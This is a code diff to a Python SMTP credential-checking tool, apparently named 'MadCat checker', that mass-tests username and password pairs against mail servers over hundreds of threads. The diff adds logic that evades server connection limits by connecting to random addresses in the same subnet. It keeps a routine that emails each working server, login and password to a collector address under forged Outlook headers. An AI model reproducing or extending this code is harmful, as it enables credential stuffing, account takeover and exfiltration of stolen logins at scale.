@@ -128,6 +128,21 @@ def get_rand_ip_of_host(host):
 	except:
 		return random.choice(socket.getaddrinfo(host, 0, family=socket.AF_INET, proto=socket.IPPROTO_TCP))[4][0]
 
+def get_rand_ip_in_subnet(ip):
+	return re.sub(r'\.\d+$', '.'+str(random.choice(range(255))), str(ip))
+
+def get_free_smtp_server(smtp_server, port):
+	smtp_class = smtplib.SMTP_SSL if port == '465' else smtplib.SMTP
+	try:
+		smtp_server_ip = get_rand_ip_of_host(smtp_server)
+		return smtp_class(smtp_server_ip, port, local_hostname=smtp_server, timeout=5)
+	except Exception as e:
+		if re.search(r'too many connections|threshold limitation|parallel connections|try later|refuse', e.lower()):
+			smtp_server_ip = get_rand_ip_in_subnet(get_rand_ip_of_host(smtp_server))
+			return smtp_class(smtp_server_ip, port, local_hostname=smtp_server, timeout=5)
+		else:
+			raise Exception(e)
+
 def quit(signum, frame):
 	print('\r\n'+inf+cyan('Exiting... See ya later. Bye.',1))
 	sys.exit(0)
@@ -164,33 +179,33 @@ def smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password
 		smtp_login = login_template.replace('%EMAILADDRESS%', smtp_user).replace('%EMAILLOCALPART%', smtp_user.split('@')[0]).replace('%EMAILDOMAIN%', smtp_user.split('@')[1])
 	else:
 		smtp_login = smtp_user
-	smtp_class = smtplib.SMTP_SSL if port == '465' else smtplib.SMTP
-	with smtp_class(get_rand_ip_of_host(smtp_server), port, local_hostname=smtp_server, timeout=5) as server_obj:
-		server_obj.set_debuglevel(debuglevel)
+	server_obj = get_free_smtp_server(smtp_server, port)
+	server_obj.set_debuglevel(debuglevel)
+	server_obj.ehlo()
+	if server_obj.has_extn('starttls') and port != '465':
+		server_obj.starttls()
 		server_obj.ehlo()
-		if server_obj.has_extn('starttls'):
-			server_obj.starttls()
-			server_obj.ehlo()
-		server_obj.login(smtp_login, password)
-		if verify_email:
-			headers_arr = [
-				'From: MadCat checker <%s>'%smtp_user,
-				'Resent-From: admin@localhost',
-				'To: '+verify_email,
-				'Subject: new SMTP from MadCat checker',
-				'Return-Path: '+smtp_user,
-				'Reply-To: '+smtp_user,
-				'X-Priority: 1',
-				'X-MSmail-Priority: High',
-				'X-Mailer: Microsoft Office Outlook, Build 10.0.5610',
-				'X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1441',
-				'MIME-Version: 1.0',
-				'Content-Type: text/html; charset="utf-8"',
-				'Content-Transfer-Encoding: 8bit'
-			]
-			body = f'{smtp_server}|{port}|{smtp_login}|{password}'
-			message_as_str = '\n'.join(headers_arr+['', body, ''])
-			server_obj.sendmail(smtp_user, verify_email, message_as_str)
+	server_obj.login(smtp_login, password)
+	if verify_email:
+		headers_arr = [
+			'From: MadCat checker <%s>'%smtp_user,
+			'Resent-From: admin@localhost',
+			'To: '+verify_email,
+			'Subject: new SMTP from MadCat checker',
+			'Return-Path: '+smtp_user,
+			'Reply-To: '+smtp_user,
+			'X-Priority: 1',
+			'X-MSmail-Priority: High',
+			'X-Mailer: Microsoft Office Outlook, Build 10.0.5610',
+			'X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1441',
+			'MIME-Version: 1.0',
+			'Content-Type: text/html; charset="utf-8"',
+			'Content-Transfer-Encoding: 8bit'
+		]
+		body = f'{smtp_server}|{port}|{smtp_login}|{password}'
+		message_as_str = '\n'.join(headers_arr+['', body, ''])
+		server_obj.sendmail(smtp_user, verify_email, message_as_str)
+	server_obj.quit()
 
 def worker_item(jobs_que, results_que):
 	global min_threads, threads_counter, verify_email, goods, no_jobs_left, loop_times, default_login_template
@@ -307,7 +322,7 @@ mem_usage = 0
 cpu_usage = 0
 net_usage = 0
 min_threads = 50
-max_threads = debuglevel or 1000
+max_threads = debuglevel or 500
 threads_counter = 0
 mx_cache = {}
 no_jobs_left = False
